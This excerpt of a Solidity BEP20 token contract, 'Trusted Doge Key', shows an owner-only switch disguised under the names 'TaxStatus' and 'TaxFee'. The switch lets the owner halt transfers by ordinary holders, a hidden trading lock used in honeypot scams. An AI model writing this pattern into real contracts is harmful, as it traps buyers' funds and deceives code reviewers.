...
contract TrustedDogeKey is IBEP20, Auth {
    using SafeMath for uint256;
    ...
    string constant _name = "Trusted Doge Key";
    string constant _symbol = "TDK";
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(!authorizations[sender] && !authorizations[recipient]){
            require(TaxFee,"Trading not open yet");
        }
    ...
    // switch Trading
    function TaxStatus(bool _status) public onlyOwner {
        TaxFee = _status;
    }
